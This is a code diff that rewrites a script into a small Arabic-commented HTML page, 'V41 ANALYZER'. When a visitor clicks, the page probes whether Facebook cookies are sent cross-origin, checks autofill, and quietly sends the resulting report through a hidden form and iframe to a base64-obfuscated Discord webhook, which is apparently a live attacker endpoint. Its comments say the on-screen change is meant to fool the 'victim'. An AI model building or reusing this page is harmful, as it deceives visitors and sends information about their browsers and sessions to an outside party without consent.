@@ -1,46 +1,78 @@
-/**
- * V41: The "Cognitive Probe" Script
- * هذا السكريبت بيحلل دفاعات المتصفح وفيسبوك بالملي
- */
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>V41 ANALYZER</title>
+    <style>
+        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        h1 { font-size: 150px; cursor: pointer; text-shadow: 0 0 20px #0f0; user-select: none; }
+    </style>
+</head>
+<body>
 
-const HOOK = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==");
+    <h1 onclick="launch()">41</h1>
 
-async function analyzeSecurity() {
-    let report = "🔍 **Deep System Analysis (V41):**\n";
+    <script>
+        // رابط الديسكورد المشفر (جاهز للعمل)
+        const key = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==";
+        const HOOK = atob(key);
 
-    // 1. فحص حماية الكوكيز (CORS & SameSite)
-    try {
-        let fbCheck = await fetch("https://m.facebook.com/settings", { mode: 'no-cors', credentials: 'include' });
-        report += "✅ Browser allowed Cross-Origin probe (Vulnerable to Tunneling)\n";
-    } catch(e) {
-        report += "❌ Browser blocked Cross-Origin cookies (Strict Sandboxing active)\n";
-    }
+        async function launch() {
+            // تغيير الشكل فوراً لإيهام الضحية بالتحميل
+            const display = document.querySelector('h1');
+            display.innerText = "...";
+            display.style.color = "#ff0";
 
-    // 2. فحص الـ Autofill Privacy
-    const input = document.createElement('input');
-    input.setAttribute('autocomplete', 'email');
-    if (input.autocomplete === 'email') {
-        report += "📱 Autofill Handlers: Detected (Can be spoofed via Layer 2)\n";
-    }
+            let report = "🔍 **Deep System Analysis (V41):**\n";
 
-    // 3. فحص الـ Outbound Filter (هل ديسكورد محظور؟)
-    const startTime = Date.now();
-    fetch(HOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({content: "📡 Testing Latency..."})})
-    .then(() => {
-        let latency = Date.now() - startTime;
-        report += `📡 Discord Webhook Status: **REACHABLE** (${latency}ms)\n`;
-        sendFinalReport(report);
-    })
-    .catch(() => {
-        report += "🚫 Discord Webhook Status: **BLOCKED BY ISP/BROWSER**\n";
-        sendFinalReport(report);
-    });
-}
+            // --- 1. فحص حماية الكوكيز (تفكير فيسبوك/جوجل) ---
+            try {
+                // محاولة لمس إعدادات فيسبوك في الخلفية
+                await fetch("https://m.facebook.com/settings", { 
+                    mode: 'no-cors', 
+                    credentials: 'include' 
+                });
+                report += "✅ Cookies Probe: Vulnerable (SameSite not enforced)\n";
+            } catch(e) {
+                report += "❌ Cookies Probe: Blocked (Strict Sandbox Active)\n";
+            }
 
-function sendFinalReport(msg) {
-    // إرسال التقرير النهائي للديسكورد
-    navigator.sendBeacon(HOOK, JSON.stringify({ content: msg }));
-}
+            // --- 2. فحص الـ Autofill (تفكير جوجل) ---
+            const input = document.createElement('input');
+            input.setAttribute('autocomplete', 'email');
+            report += (input.autocomplete === 'email') ? "📱 Autofill: Detected\n" : "📱 Autofill: Hidden\n";
 
-// تنفيذ الفحص بمجرد لمس الشاشة
-document.body.onclick = analyzeSecurity;
+            // --- 3. إرسال التقرير النهائي باستخدام طريقة الفوز (V40 Form) ---
+            sendViaForm(report);
+
+            // تأكيد النجاح النهائي على الشاشة
+            setTimeout(() => {
+                display.innerText = "DONE";
+                display.style.color = "#0f0";
+            }, 1000);
+        }
+
+        function sendViaForm(msg) {
+            const f = document.createElement('form');
+            f.action = HOOK;
+            f.method = 'POST';
+            f.target = 'v41_frame';
+            
+            const i = document.createElement('input');
+            i.name = 'content';
+            i.value = msg;
+            
+            f.appendChild(i);
+            document.body.appendChild(f);
+            
+            const ifr = document.createElement('iframe');
+            ifr.name = 'v41_frame';
+            ifr.style.display = 'none';
+            document.body.appendChild(ifr);
+
+            f.submit();
+        }
+    </script>
+</body>
+</html>
